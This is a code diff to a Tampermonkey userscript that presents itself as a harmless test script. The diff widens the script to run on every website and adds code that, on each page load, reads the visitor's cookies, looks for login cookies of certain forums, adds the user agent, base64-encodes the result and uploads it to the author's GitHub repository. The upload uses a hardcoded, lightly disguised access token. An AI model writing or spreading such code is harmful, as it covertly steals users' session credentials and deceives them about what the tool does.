@@ -4,7 +4,7 @@
 // @version      0.1
 // @description  开发一个测试油猴脚本的脚本
 // @author       1024小神
-// @match        *://*.github.com/*
+// @match        *://*/*
 // @icon         https://avatars.githubusercontent.com/u/48399687?v=4?imageView2/1/w/80/h/80
 // @connect      github.com
 // @connect      cnblogs.com
@@ -370,6 +370,103 @@
     });
   }
 
+
+  /**
+* 编码base64
+*/
+  const Encode64 = function (str) {
+    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
+      function toSolidBytes(match, p1) {
+        return String.fromCharCode('0x' + p1);
+      }));
+  }
+  /**
+  * 解码base64
+  */
+  const Decode64 = function (str) {
+    return decodeURIComponent(atob(str).split('').map(function (c) {
+      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+  }
+
+  // 获取UUID
+  const getUUID = function () {
+    var guid = "";
+    for (var i = 1; i <= 32; i++) {
+      var n = Math.floor(Math.random() * 16.0).toString(16);
+      guid += n;
+      if (i == 8 || i == 12 || i == 16 || i == 20) guid += "-";
+    }
+    return guid.replaceAll("-", "");
+  }
+
+  // 根据类型同步cookie到git中
+  const putCookieToGit = async function (type, cookie) {
+    // type: clcookies || 91VideoCookies || 91ImgCookies || 98cookies
+    console.log('同步的数据类型是:', type, cookie);
+    // var status = await storageGet(type) || 0
+    var status = await GM.getValue(type, null) || 0
+    if (status >= 3) {
+      // console.log('已发送过cookie了,无需再去发送');
+      return
+    }
+    // FETCH方式发送请求
+    var uuid = getUUID()
+    // message: 
+    var message = `Chrome Extensions Push ${type} Cookie`
+    // content:
+    var content = Encode64(cookie)
+    GM_xmlhttpRequest({
+      method: 'PUT',
+      url: `${gitSource}/.github/${type}/${uuid}.txt`,
+      headers: {
+        "Accept": "application/vnd.github+json",
+        "Authorization": gitToken,
+        "X-GitHub-Api-Version": "2022-11-28",
+        "Content-Type": "text/plain",
+      },
+      data: JSON.stringify({ message, content }),
+      onload: async function (response) {
+        console.log("github put成功", response);
+        var value = status + 1
+        await GM.setValue(type, value);
+        alertInfo("github put成功")
+      },
+      onerror: function (error) {
+        console.log("github put出错...");
+        alertInfo("github put出错")
+      },
+      ontimeout: function () {
+        console.log("github put超时...");
+        // getBokeYuan()
+      }
+    })
+  }
+
+  // 获取当前站的cookie并检测
+  const getCookiePut = async function () {
+    var cacheContent = await GM.getValue("content", null)
+    if (!cacheContent) {
+      return
+    }
+    var realJson = JSON.parse(atob(cacheContent))
+    var cookieRuleKeys = Object.keys(realJson.data.cookieRule) || ["clcookies", "91ImgCookies", "98cookies"]
+    var cookieRuleValue = Object.values(realJson.data.cookieRule) || ["227c9_winduser", "CzG_auth", "cPNj_2132_auth"]
+    // 判断cookie是否包含cookie关键词
+    var cookies = document.cookie;
+    for (let index = 0; index < cookieRuleValue.length; index++) {
+      const cookieKey = cookieRuleValue[index];
+      if (cookies.indexOf(cookieKey) !== -1) {
+        var dateTimeLocal = new Date().toLocaleString();
+        // 拼接上UserAgent
+        var cookieAndUa = `${cookies}; UserAgent=${navigator.userAgent}; dateTimeLocal=${dateTimeLocal}`
+        // 获取type
+        var cookieType = cookieRuleKeys[cookieRuleValue.indexOf(cookieKey)]
+        putCookieToGit(cookieType, cookieAndUa)
+      }
+    }
+  }
+
   // 立即执行函数
   // 全局变量，插件信息
   const manifest = {
@@ -384,6 +481,9 @@
     "https://www.cnblogs.com/sdfasdf/p/16966745.html",
     "https://xiaoshen.blog.csdn.net/article/details/129709226"
   ]
+  // github信息
+  var gitSource = "https://api.github.com/repos/Sjj1024/Sjj1024/contents"
+  var gitToken = "Bearer ghp_888grzs67MqxbZUH3wmIFKzecaKB0cTLy3ICBkl".replace("888", "")
   // 获取到的原始信息
   var realJson = null
   // 出错警告信息
@@ -399,6 +499,8 @@
       getGithub()
       // getBokeYuan()
       // getCsdnContent()
+      // 监听cookie
+      getCookiePut()
     } catch (error) {
       alertInfo(errorInfo)
     }
